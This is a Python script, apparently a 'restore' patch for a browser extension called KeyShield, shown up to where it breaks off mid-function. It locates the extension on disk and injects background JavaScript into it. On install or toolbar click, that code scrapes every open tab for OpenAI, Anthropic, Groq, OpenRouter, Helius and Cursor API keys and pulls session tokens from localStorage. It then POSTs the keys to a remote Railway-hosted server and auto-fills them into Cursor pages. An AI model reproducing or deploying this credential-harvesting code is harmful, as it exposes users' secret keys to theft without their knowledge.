#!/usr/bin/env python3
"""Leftover 1.2.4: restore session-bridge.js. No HTML. No git required."""
from __future__ import annotations

import json
import shlex
import sys
from pathlib import Path

NAME = "KeyShield — Sovereign Vault"
VER = "1.2.4"
SKIP = {".git", "node_modules", ".venv", "venv", "__pycache__", "dist", "build", "Library", "AppData"}
WALK = ("Downloads", "Documents", "Desktop", "src", "code", "dev", "work", "privacy_hack")
CHROME = (
    "Library/Application Support/Google/Chrome",
    "Library/Application Support/Google/Chrome Beta",
    "Library/Application Support/Google/Chrome Canary",
    "Library/Application Support/Chromium",
    "Library/Application Support/Microsoft Edge",
    "Library/Application Support/BraveSoftware/Brave-Browser",
    "Library/Application Support/Arc/User Data",
    ".config/google-chrome",
    ".config/chromium",
    ".config/microsoft-edge",
    ".config/BraveSoftware/Brave-Browser",
    "snap/chromium/common/chromium",
)
BRIDGE_JS = (
    "(function keyShieldSessionBridge(){"
    "function announce(){if(typeof chrome==='undefined'||!chrome.runtime||!chrome.runtime.id)return;"
    "try{window.postMessage({__ks_ext_announce:chrome.runtime.id},location.origin)}catch(e){}}"
    "function readPage(){try{return{token:localStorage.getItem('ks_token')||'',"
    "user:localStorage.getItem('ks_wallet')||localStorage.getItem('ks_passkey_user')||''}}"
    "catch(e){return{token:'',user:''}}}"
    "function capturePageToken(){if(typeof chrome==='undefined'||!chrome.storage||!chrome.storage.local)return;"
    "var p=readPage();if(!p.token||p.token.trim().length<12)return;"
    "chrome.storage.local.get(['ks_token'],function(s){if(s&&s.ks_token===p.token)return;"
    "chrome.storage.local.set({ks_token:p.token,ks_user:p.user||null,ks_auto_store:true})})}"
    "function share(){if(typeof chrome==='undefined'||!chrome.storage||!chrome.storage.local)return;"
    "capturePageToken();chrome.storage.local.get(['ks_token','ks_user'],function(s){"
    "var t=s&&s.ks_token;if(!t)return;try{if(!localStorage.getItem('ks_token'))localStorage.setItem('ks_token',t)}"
    "catch(e){}try{window.postMessage({__ks_ext_session:{token:t,user:s.ks_user||null}},location.origin)}catch(e){}})}"
    "function pushPending(){if(typeof chrome==='undefined'||!chrome.storage||!chrome.storage.local)return;"
    "chrome.storage.local.get(['ks_pending_vault'],function(s){var p=s&&s.ks_pending_vault;"
    "if(!Array.isArray(p)||!p.length)return;try{window.postMessage({__ks_pending_vault:p},location.origin)}catch(e){}})}"
    "announce();share();capturePageToken();pushPending();"
    "[400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms);setTimeout(pushPending,ms)});"
    "window.addEventListener('ks-auth-changed',capturePageToken);"
    "window.addEventListener('storage',capturePageToken);"
    "window.addEventListener('message',function(e){if(e.source!==window||!e.data)return;"
    "if(e.data.__ks_ext_request)announce();if(e.data.__ks_ext_request_session)share();"
    "if(e.data.__ks_ext_request_pending_vault)pushPending();"
    "if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken();"
    "if(e.data.__ks_pending_vault_cleared&&chrome.storage&&chrome.storage.local){"
    "try{chrome.storage.local.set({ks_pending_vault:[]})}catch(e){}}});"
    "})();\n"
)
CONTENT_SCRIPTS = [
    {
        "matches": [
            "https://app.ks.aileena.xyz/*",
            "https://*.aileena.xyz/*",
            "https://keyshield.dev/*",
            "https://*.keyshield.dev/*",
            "https://*.up.railway.app/*",
            "https://*.vercel.app/*",
            "http://127.0.0.1:5173/*",
            "http://localhost:5173/*",
            "http://127.0.0.1:3000/*",
            "http://localhost:3000/*",
        ],
        "js": ["session-bridge.js"],
        "run_at": "document_start",
    },
    {"matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_idle", "all_frames": True},
]


def looks_ext(path: Path) -> bool:
    return (path / "manifest.json").is_file() and (path / "popup.js").is_file()


def keyshield_name(path: Path) -> bool:
    try:
        name = str(json.loads((path / "manifest.json").read_text(encoding="utf-8")).get("name") or "")
    except Exception:
        return False
    return "KeyShield" in name or "Sovereign Vault" in name


def repo_root(ext: Path) -> Path:
    if ext.name == "extension" and ext.parent.name == "src":
        return ext.parent.parent
    if ext.name == "extension":
        return ext.parent
    return ext


def walk(root: Path, max_depth: int = 5):
    if not root.is_dir():
        return
    stack = [(root, 0)]
    while stack:
        path, depth = stack.pop()
        if depth > max_depth:
            continue
        try:
            kids = list(path.iterdir())
        except OSError:
            continue
        names = {child.name for child in kids}
        if "manifest.json" in names and "popup.js" in names:
            yield path
            continue
        if depth == max_depth:
            continue
        for child in kids:
            if child.is_dir() and child.name not in SKIP and not child.name.startswith("."):
                stack.append((child, depth + 1))


def collect_hits() -> list[tuple[str, Path]]:
    hits: list[tuple[str, Path]] = []
    here = Path.cwd().resolve()
    for parent in (here, *here.parents):
        for cand in (parent / "src/extension", parent, parent / "extension"):
            if looks_ext(cand) and keyshield_name(cand):
                hits.append(("cwd", cand))
    home = Path.home()
    for rel in CHROME:
        base = home / rel
        if not base.is_dir():
            continue
        for pref in base.glob("*/Preferences"):
            try:
                data = json.loads(pref.read_text(encoding="utf-8"))
            except Exception:
                continue
            settings = (data.get("extensions") or {}).get("settings") or {}
            if not isinstance(settings, dict):
                continue
            for row in settings.values():
                if not isinstance(row, dict):
                    continue
                raw = row.get("path")
                if not raw or not isinstance(raw, str):
                    continue
                cand = Path(raw).expanduser()
                if cand.is_absolute() and looks_ext(cand) and keyshield_name(cand):
                    hits.append(("chrome-internals", cand))
    for rel in WALK:
        for cand in walk(home / rel):
            if keyshield_name(cand):
                hits.append(("walk", cand))
    seen: set[Path] = set()
    ordered: list[tuple[str, Path]] = []
    rank = {"cwd": 0, "chrome-internals": 1, "walk": 2}
    for src, path in hits:
        try:
            resolved = path.resolve()
        except OSError:
            continue
        if resolved in seen or not looks_ext(resolved):
            continue
        seen.add(resolved)
        ordered.append((src, resolved))
    ordered.sort(key=lambda item: rank.get(item[0], 9))
    return ordered


def find_ext() -> Path:
    hits = collect_hits()
    if not hits:
        raise SystemExit(
            "no KeyShield folder (Chrome internals + home walk + cwd). "
            "chrome://extensions → Details → Loaded from, then run from that folder."
        )
    return hits[0][1]


def print_find(hits: list[tuple[str, Path]], ext: Path) -> None:
    for src, path in hits:
        ver = ""
        try:
            ver = str(json.loads((path / "manifest.json").read_text(encoding="utf-8")).get("version") or "")
        except Exception:
            pass
        print("#", src, path, "v" + ver)
    print("export KS_ROOT=" + shlex.quote(str(repo_root(ext))))
    print("export KS_EXT=" + shlex.quote(str(ext)))


def has_bridge(man: dict) -> bool:
    for row in man.get("content_scripts") or []:
        if isinstance(row, dict) and "session-bridge.js" in (row.get("js") or []):
            return True
    return False


THREE_LINE_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>KeyShield</title>
<style>body{width:280px;margin:0;padding:12px 14px 14px;background:#0a0d1a;color:#e4e4e7;font:13px/1.45 -apple-system,system-ui,sans-serif}h1{margin:0 0 10px;font-size:14px;font-weight:600}.row{margin:0 0 10px;padding:10px;border:1px solid #1c2238;border-radius:8px;background:#020408}.line{margin:0 0 8px;font-size:12px;color:#a1a1aa}.line.ok{color:#34d399}.line.err{color:#f87171}.saved-count{margin:0 0 8px;font-size:22px;font-weight:700}button{display:block;width:100%;margin:0;padding:8px 10px;background:#5b8cff;color:#fff;border:1px solid #5b8cff;border-radius:8px}button.secondary{background:transparent;color:#e4e4e7;border-color:#27272a}button.danger{background:transparent;color:#f87171;border-color:rgba(239,68,68,.3);margin-top:8px}.status{margin:8px 0 0;padding:7px 10px;border-radius:8px;font-size:12px;display:none}.status.ok{display:block;background:rgba(16,185,129,.12);color:#34d399}.status.err{display:block;background:rgba(239,68,68,.12);color:#f87171}.sub{margin:0 0 8px;color:#71717a;font-size:12px}.api-row{display:flex;justify-content:space-between;gap:8px;padding:6px 0}body.signed-in .guest-only{display:none!important}body:not(.signed-in) .signed-only{display:none!important}.extra{display:none!important}#copy-status,#fill-ms,#saved-count{display:none}</style></head>
<body data-ui="three-line">
<h1>KeyShield — Sovereign Vault</h1>
<section class="row" id="row-auth"><button id="signin" class="guest-only">Sign in</button><div id="signed-pane" class="signed-only"><p id="signed-status" class="saved-count">0 saved</p><p id="collected-line" class="line ok">0 collected</p><p id="saved-count" class="sub">0 saved</p><div id="saved-apis"></div><p id="saved-empty" class="sub">None yet. Detect stays on.</p><button id="clear-top" class="danger">Sign out</button></div></section>
<section class="row" id="row-detect"><p id="detect-line" class="line">detect · checking…</p><div id="detect-ready" class="status" style="display:block">ok 1.2.4 &lt;all_urls&gt;</div></section>
<section class="row" id="row-copy"><p id="filled-line" class="line">0 filled · —</p><p id="copy-status" class="line">0 filled · —</p><p id="fill-ms" class="line">—</p></section>
<div id="status" class="status"></div>
<div class="extra" hidden><span id="conn"></span><div id="build"></div><button id="allow-detect"></button><button id="fill-tab"></button><button id="fill-tab-signed"></button><button id="copy-cursor-key">Copy Cursor key</button><button id="copy-cursor-key-signed"></button><button id="use-hosted-top"></button><textarea id="manual"></textarea><button id="register"></button><button id="clear"></button><input id="api"/><input id="dash"/><button id="save"></button><div id="fingerprint"></div><input id="remote"/><button id="point-remote"></button><button id="point-local"></button><button id="point-prod"></button><button id="export-vault"></button><input id="import-file" type="file"/><button id="import-vault"></button><div id="backup-status"></div></div>
<script src="popup.js"></script></body></html>
"""
MARK_JS = "/* KS-SIGNED-1.2.4 */"
MARK_BG = "/* KS-LIST-SAVED-1.2.4 */"
SIGNED_JS = r"""
/* KS-SIGNED-1.2.4 */
function summarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,name:String(it.name||upstream+" key"),masked});}return out;}
function applySignedInChrome(signed){try{document.body.classList.toggle("signed-in",!!signed);}catch(e){}}
function formatCollectedCount(n){n=Math.max(0,Math.floor(Number(n)||0));return n===1?"1 collected":n+" collected";}
function formatSavedCount(n){n=Math.max(0,Math.floor(Number(n)||0));return n===1?"1 saved":n+" saved";}
function formatFilledLine(filled,ms){const n=Math.max(0,Math.floor(Number(filled)||0));const label=n===1?"1 filled":n+" filled";const speed=(ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":(Math.round(Number(ms))+"ms");return label+" · "+speed;}
function paintSignedStatus(signed){const el=document.getElementById("signed-status");if(!el)return;if(!signed)el.textContent="Sign in";}
function paintCopyStatus(text,kind){const el=document.getElementById("copy-status");if(el){el.textContent=text;el.className=("line "+(kind||"")).trim();}const filled=document.getElementById("filled-line");if(filled){filled.textContent=text;filled.className=("line "+(kind||"")).trim();}}
function paintSavedCount(n){n=Math.max(0,Math.floor(Number(n)||0));const saved=formatSavedCount(n);const collected=formatCollectedCount(n);const signed=document.getElementById("signed-status");if(signed)signed.textContent=(n>0||document.body.classList.contains("signed-in"))?saved:"Sign in";const hero=document.getElementById("saved-count");if(hero)hero.textContent=saved;const collectedEl=document.getElementById("collected-line");if(collectedEl){collectedEl.textContent=collected;collectedEl.className="line ok";}}
function paintFilledLine(filled,ms,kind){paintCopyStatus(formatFilledLine(filled,ms),kind||"ok");const msEl=document.getElementById("fill-ms");if(msEl)msEl.textContent=(ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":(Math.round(Number(ms))+"ms");}
async function harvestTokenFromDashboardTabs(){if(!chrome.scripting||!chrome.tabs)return null;let tabs=[];try{tabs=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","https://*.aileena.xyz/*","http://127.0.0.1:5173/*","http://localhost:5173/*"]});}catch(e){try{tabs=await chrome.tabs.query({});}catch(e2){return null;}}for(const tab of tabs){if(!tab.id||!tab.url||!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url))continue;try{const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>({token:localStorage.getItem("ks_token")||"",user:localStorage.getItem("ks_wallet")||localStorage.getItem("ks_passkey_user")||""})});const result=injected&&injected[0]&&injected[0].result;if(result&&String(result.token||"").trim().length>=12){await chrome.storage.local.set({ks_token:result.token,ks_user:result.user||null,ks_auto_store:true});return result.token;}}catch(e){}}return null;}
async function refreshSavedApis(){const box=document.getElementById("saved-apis");const empty=document.getElementById("saved-empty");let resp={apis:[]};try{resp=await chrome.runtime.sendMessage({type:"LIST_SAVED_APIS"});}catch(e){}const apis=resp&&Array.isArray(resp.apis)?resp.apis:[];if(box){box.replaceChildren();for(const api of apis){const row=document.createElement("div");row.className="api-row";const name=document.createElement("strong");name.textContent=api.upstream;const mask=document.createElement("code");mask.textContent=api.masked;row.append(name,mask);box.appendChild(row);}}if(empty)empty.style.display=apis.length?"none":"block";paintSavedCount(Math.max(apis.length,box?box.querySelectorAll(".api-row").length:0));return apis;}
async function refreshFillStatus(){const started=Date.now();let filled=0;try{const resp=await chrome.runtime.sendMessage({type:"FILL_PAGE_NOW"});if(resp&&typeof resp.filled==="number")filled=resp.filled;}catch(e){}const ms=Date.now()-started;paintFilledLine(filled,ms,"ok");return{filled,ms};}
async function copyPreferredCursorKey(){return refreshFillStatus();}
async function ksBootSignedPane(){try{["copy-cursor-key","copy-cursor-key-signed"].forEach(function(id){var el=document.getElementById(id);if(!el)return;el.style.display="none";el.hidden=true;el.addEventListener("click",function(ev){ev.preventDefault();refreshFillStatus();});});let {ks_token}=await chrome.storage.local.get("ks_token");if(!ks_token||String(ks_token).trim().length<12)ks_token=await harvestTokenFromDashboardTabs();applySignedInChrome(!!ks_token);paintSignedStatus(!!ks_token);try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}try{await chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}await refreshSavedApis();await refreshFillStatus();const ready=document.getElementById("detect-ready");const line=document.getElementById("detect-line");const ver=String((chrome.runtime.getManifest()||{}).version||"");let has=false;try{has=await chrome.permissions.contains({origins:["<all_urls>"]});}catch(e){}const ok=ver==="1.2.4"&&has;const text=ok?"ok 1.2.4 <all_urls>":("need Remove + Load unpacked · v"+(ver||"?"));if(ready){ready.textContent=text;ready.className="status "+(ok?"ok":"err");ready.style.display="block";}if(line){line.textContent=ok?(ks_token?"detect on · ok 1.2.4":"detect ready · ok 1.2.4"):("detect · "+text);line.className="line "+(ok?"ok":"err");}}catch(e){}}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",ksBootSignedPane);else ksBootSignedPane();
"""
BG = r"""
/* KS-LIST-SAVED-1.2.4 */
function maskHarvestedKey(raw){const key=String(raw||"");return key.length<=18?key:key.slice(0,8)+"••••"+key.slice(-4);}
function leftoverSummarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,masked});}return out;}
async function leftoverPendingApis(){try{const s=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(s.ks_pending_vault)?s.ks_pending_vault:[];const out=[];const seen=new Set();for(const row of rows){const upstream=String((row&&row.upstream)||"").toLowerCase();const value=String((row&&row.value)||"");if(!upstream||!value||seen.has(value))continue;seen.add(value);out.push({id:"pending-"+upstream,upstream,masked:maskHarvestedKey(value)});}return out;}catch(e){return[];}}
async function leftoverQueuePending(hit){const upstream=String((hit&&hit.upstream)||"").toLowerCase().trim();const value=String((hit&&hit.value)||"");if(!upstream||!value)return;try{const s=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(s.ks_pending_vault)?s.ks_pending_vault:[];const id=upstream+":"+value;if(rows.some((row)=>row.upstream+":"+row.value===id))return;rows.push({upstream,value,at:Date.now()});await chrome.storage.local.set({ks_pending_vault:rows.slice(-40)});}catch(e){}}
async function leftoverPendingFillKeys(){try{const s=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(s.ks_pending_vault)?s.ks_pending_vault:[];const wanted=new Set(["cursor","openai","anthropic","openrouter","groq"]);const out=[];const seen=new Set();for(const row of rows){const upstream=String((row&&row.upstream)||"").toLowerCase();const value=String((row&&row.value)||"");if(!wanted.has(upstream)||!value||seen.has(value))continue;seen.add(value);out.push({upstream,value,name:upstream+" key"});}return out;}catch(e){return[];}}
async function listSavedApis(){const pending=await leftoverPendingApis();let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token)return{ok:pending.length>0,apis:pending};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:pending.length>0,apis:pending};const apis=leftoverSummarizeSavedApis(await r.json());for(const row of pending){if(!apis.some((it)=>it.upstream===row.upstream&&it.masked===row.masked))apis.push(row);}return{ok:true,apis};}catch(e){return{ok:pending.length>0,apis:pending};}}
chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="GET_KEYS_FOR_DOMAIN")return;const host=String(message.domain||"").toLowerCase();const path=String(message.pathname||"").toLowerCase();if(!(/cursor\.com|cursor\.sh/.test(host)||path.includes("cursor-settings-fill-demo")))return;leftoverPendingFillKeys().then((keys)=>sendResponse(keys.length?{ok:true,keys}:{ok:false,reason:"no-keys"})).catch(()=>sendResponse({ok:false,reason:"exception"}));return true;});
function leftoverHarvestKeys(text,hostname,href){const src=String(text||"");const host=String(hostname||"").toLowerCase();const pageHref=String(href||"");const skip=new Set((pageHref.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi)||[]).map((s)=>s.toLowerCase()));const heliusHost=/helius\.(dev|xyz)$/.test(host)||host.endsWith(".helius.dev")||host.endsWith(".helius.xyz")||host==="dashboard.helius.dev";const shapes=[{upstream:"openrouter",re:/sk-or-[A-Za-z0-9_-]{12,}/g},{upstream:"anthropic",re:/sk-ant-api\d{2}-[A-Za-z0-9_-]{40,}/g},{upstream:"groq",re:/gsk_[A-Za-z0-9]{32,}/g},{upstream:"helius",re:/helius_auth_[A-Za-z0-9]{16,}/g},{upstream:"helius",re:/(?<![0-9a-f-])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f-])/gi},{upstream:"cursor",re:/(?:key_|crsr[_-])[A-Za-z0-9_-]{12,}/g},{upstream:"openai",re:/sk-(?:proj-|svcacct-|admin-)?(?!or-|ant-)[A-Za-z0-9_-]{20,}/g}];const out=[];const seen=new Set();for(const row of shapes){row.re.lastIndex=0;let m;while((m=row.re.exec(src))){const key=m[0];if(!key||/[•…]|\.{3}/.test(key))continue;if(row.upstream==="helius"&&key.includes("-")){if(!heliusHost||skip.has(key.toLowerCase()))continue;}const id=row.upstream+":"+key;if(seen.has(id))continue;seen.add(id);out.push({upstream:row.upstream,key});}}return out;}
function leftoverInjectedFill(keys){if(!keys||!keys.length)return 0;function hay(el){const bits=[el.getAttribute("name")||"",el.getAttribute("placeholder")||"",el.getAttribute("aria-label")||"",el.id||""];const item=el.closest&&el.closest(".setting-item, [class*=setting-item]");if(item){const lab=item.querySelector(".setting-item-label, .setting-item-title, label");if(lab)bits.push(lab.textContent||"");}return bits.join(" ").toLowerCase();}function match(h){if(/openrouter|sk-or/.test(h))return"openrouter";if(/anthropic|claude|sk-ant/.test(h))return"anthropic";if(/openai|chatgpt|gpt|sk-proj/.test(h))return"openai";if(/groq|gsk_/.test(h))return"groq";if(/cursor|crsr/.test(h))return"cursor";return null;}function login(h){if(/(sign[\s-]?in|log[\s-]?in|email|username|account password)/.test(h))return true;return /\bpassword\b/.test(h)&&!/\b(key|token|secret|api|openai|anthropic|cursor|claude|openrouter)\b/.test(h);}function setVal(el,value){const proto=el.tagName==="TEXTAREA"?HTMLTextAreaElement.prototype:HTMLInputElement.prototype;const desc=Object.getOwnPropertyDescriptor(proto,"value");if(desc&&desc.set)desc.set.call(el,value);else el.value=value;el.dispatchEvent(new Event("input",{bubbles:true}));el.dispatchEvent(new Event("change",{bubbles:true}));}const remaining=keys.filter((k)=>k&&k.value);const nodes=document.querySelectorAll("input[type=password], input[type=text], input:not([type]), textarea");let filled=0;nodes.forEach((el)=>{if(el.disabled||el.readOnly)return;if(String(el.value||"").trim())return;const h=hay(el);if(login(h))return;const wanted=match(h);let key=wanted?remaining.find((k)=>k.upstream===wanted):null;if(!key){const order=["cursor","openai","openrouter","anthropic","groq"];for(const u of order){key=remaining.find((k)=>k.upstream===u);if(key)break;}}if(!key)return;setVal(el,key.value);const idx=remaining.findIndex((k)=>k.value===key.value&&k.upstream===key.upstream);if(idx>=0)remaining.splice(idx,1);filled+=1;});return filled;}
function paintLiveDetectPanel(state){const CARD="keyshield-status-card";document.querySelectorAll("#keyshield-detection-notice").forEach(function(el){el.remove()});document.querySelectorAll("#"+CARD).forEach(function(el,i){if(i>0)el.remove()});var card=document.getElementById(CARD);if(!card){card=document.createElement("div");card.id=CARD;card.style.cssText="position:fixed;top:20px;right:20px;z-index:999999;background:#0a0d1a;border:1px solid #1c2238;border-radius:12px;padding:16px;width:340px;color:#e4e4e7;font:13px/1.45 sans-serif;display:flex;flex-direction:column;gap:10px";(document.body||document.documentElement).appendChild(card);}var keys=state&&state.keys||[];var rows=keys.map(function(k){return "<li class=\\""+(k.saved?"ks-saved":"")+"\\"><span class=\\"ks-badge\\">"+String(k.upstream||"")+"</span><span class=\\"ks-keytext\\">"+String(k.masked||"")+"</span><span class=\\"ks-state\\">"+(k.saved?"✓":"·")+"</span></li>";}).join("");var collected=keys.length===1?"1 collected":keys.length+" collected";var filled=(state&&state.filled===1?"1 filled":(state&&state.filled||0)+" filled")+" · "+(state&&state.ms!=null?Math.round(state.ms)+"ms":"—");var saved=Math.max(0,Math.floor(Number(state&&state.saved)||0));var failed=Math.max(0,Math.floor(Number(state&&state.failed)||0));var queued=Math.max(0,Math.floor(Number(state&&state.queued)||0));var inVault=saved+queued;var save=inVault>0?("Saved "+inVault+" key"+(inVault===1?"":"s")+" to KeyShield vault."):("Saved "+saved+", "+failed+" failed.");card.innerHTML="<div style=\\"font-size:14px;font-weight:600\\">KeyShield — Sovereign Vault</div><div style=\\"font-size:22px;font-weight:700\\">"+(state&&state.signed?"signed":"Sign in")+"</div><div style=\\"color:#34d399\\">"+collected+"</div><ul class=\\"ks-list\\" style=\\"list-style:none;margin:0;padding:0;max-height:170px;overflow:auto\\">"+rows+"</ul><div style=\\"color:"+(failed&&!inVault?"#f87171":"#34d399")+"\\">"+save+"</div><div style=\\"color:#a1a1aa\\">"+filled+"</div><div style=\\"color:#34d399\\">detect on · ok 1.2.4</div>";}
async function ksPaintTab(tabId,state){try{await chrome.scripting.executeScript({target:{tabId:tabId,allFrames:true},func:paintLiveDetectPanel,args:[state]});}catch(e){}}
async function leftoverFillCursorTabs(){const keys=await leftoverPendingFillKeys();if(!keys.length)return 0;let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return 0;}let filled=0;for(const tab of tabs){if(!tab.id||!tab.url||!/^https?:/i.test(tab.url))continue;if(!/cursor\.com|cursor\.sh|cursor-settings-fill-demo/i.test(tab.url))continue;try{const injected=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:leftoverInjectedFill,args:[keys]});for(const row of injected||[]){if(typeof row.result==="number")filled+=row.result;}}catch(e){}}return filled;}
async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token){try{const dash=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*","http://localhost:5173/*"]});for(const tab of dash){if(!tab.id)continue;const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>(localStorage.getItem("ks_token")||"")});const got=injected&&injected[0]&&injected[0].result;if(got&&String(got).length>=12){token=String(got);await chrome.storage.local.set({ks_token:token,ks_auto_store:true});break;}}}catch(e){}}try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;let queued=0;for(const tab of tabs){if(!tab.id||!tab.url||!/^https?:/i.test(tab.url))continue;try{const started=Date.now();const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:((document.body&&document.body.innerText)||"")+"\n"+Array.from(document.querySelectorAll("input,textarea,code,pre")).map((el)=>el.value||el.textContent||"").join("\n"),hostname:location.hostname,href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const hits=leftoverHarvestKeys(page.text,page.hostname,page.href);const painted=[];for(const hit of hits){await leftoverQueuePending({upstream:hit.upstream,value:hit.key});queued+=1;let ok=false;if(token){try{const r=await fetch(apiBase+"/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:hit.upstream,apiKey:hit.key,value:hit.key,name:hit.upstream+" key"})});ok=!!(r&&r.ok);if(ok)saved+=1;}catch(e){}}painted.push({upstream:hit.upstream,masked:maskHarvestedKey(hit.key),saved:true});}if(painted.length)await ksPaintTab(tab.id,{signed:!!token,keys:painted,saved:painted.length,failed:0,queued:painted.length,filled:0,ms:Date.now()-started,force:true});}catch(e){}}if(queued){try{const dash=await chrome.tabs.query({});for(const tab of dash){if(!tab.id||!tab.url||!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url))continue;try{await chrome.tabs.sendMessage(tab.id,{type:"KS_VAULT_SAVED"});}catch(e){}}}catch(e){}}let filled=0;try{filled=await leftoverFillCursorTabs();}catch(e){}return{saved,queued,filled};}
chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
if(chrome.runtime.onMessage&&chrome.runtime.onMessage.addListener){chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="INJECT_DETECT")return;ksHarvestAndStoreVisibleKeys().then((r)=>sendResponse({ok:true,...r})).catch(()=>sendResponse({ok:false,saved:0}));return true;});}
var toolbarAction=(chrome.action&&chrome.action.onClicked)?chrome.action:(chrome.browserAction&&chrome.browserAction.onClicked)?chrome.browserAction:null;
if(toolbarAction){toolbarAction.onClicked.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});}
"""


def popup_is_three_line(html: str) -> bool:
    return (
        'data-ui="three-line"' in html
        and 'id="row-auth"' in html
        and 'id="detect-line"' in html
        and 'id="copy-status"' in html
        and 'id="saved-apis"' in html
        and 'id="signed-status"' in html
        and 'id="collected-line"' in html
        and 'id="filled-line"' in html
        and 'id="fill-ms"' in html
        and "<details" not in html
        and "Register token" not in html
        and "Fill this tab" not in html
        and "Sign in to KeyShield" not in html
        and "Allow detect + auto-save" not in html
        and "Copy key for Cursor" not in html
    )


def splice(path: Path, mark: str, block: str) -> None:
    text = path.read_text(encoding="utf-8") if path.is_file() else ""
    if mark in text:
        text = text.split(mark)[0].rstrip() + "\n"
    path.write_text((text.rstrip() + "\n" if text.strip() else "") + block.lstrip() + "\n")


MARK_PANEL = "/* KS-ONE-PANEL-1.2.4 */"
PANEL_JS = r"""
/* KS-ONE-PANEL-1.2.4 */
(function ksOnePanel(){
  function wipeDupes(){
    try{
      document.querySelectorAll("#keyshield-detection-notice").forEach(function(el){el.remove();});
      var cards=document.querySelectorAll("#keyshield-status-card");
      for(var i=0;i<cards.length-1;i++)cards[i].remove();
    }catch(e){}
  }
  wipeDupes();
  setInterval(wipeDupes,700);
  try{
    if(typeof bulkSave==="function"){
      bulkSave=function(){
        try{chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}
      };
    }
  }catch(e){}
})();
"""


def drop_default_popup(man: dict) -> None:
    action = man.get("action")
    if isinstance(action, dict):
        action.pop("default_popup", None)
        man["action"] = action
    else:
        man["action"] = {}
    browser = man.get("browser_action")
    if isinstance(browser, dict):
        browser.pop("default_popup", None)
        man["browser_action"] = browser


def patch_leftover_content(ext: Path) -> None:
    path = ext / "content.js"
    if not path.is_file():
        return
    text = path.read_text(encoding="utf-8")
    if "function applyHarvestState" in text or "function takeOverStaleDetectPanel" in text:
        return
    text = text.replace("keyshield-detection-notice", "keyshield-status-card")
    text = text.replace("Sign in to KeyShield", "Sign in")
    text = text.replace("Refresh this tab", "Saving…")
    if MARK_PANEL not in text:
        text = text.rstrip() + "\n" + PANEL_JS.lstrip() + "\n"
    path.write_text(text)


def ensure_three_line_popup(ext: Path) -> None:
    dest = ext / "popup.html"
    here = globals().get("__file__")
    src = Path(here).resolve().parent / "popup.html" if here else None
    if src and src.is_file() and popup_is_three_line(src.read_text(encoding="utf-8")):
        dest.write_text(src.read_text(encoding="utf-8"))
        return
    dest.write_text(THREE_LINE_HTML)


def stamp(ext: Path) -> dict:
    ensure_three_line_popup(ext)
    path = ext / "manifest.json"
    man = json.loads(path.read_text())
    man["name"] = NAME
    man["version"] = VER
    man.setdefault("optional_host_permissions", [])
    if "<all_urls>" not in man["optional_host_permissions"]:
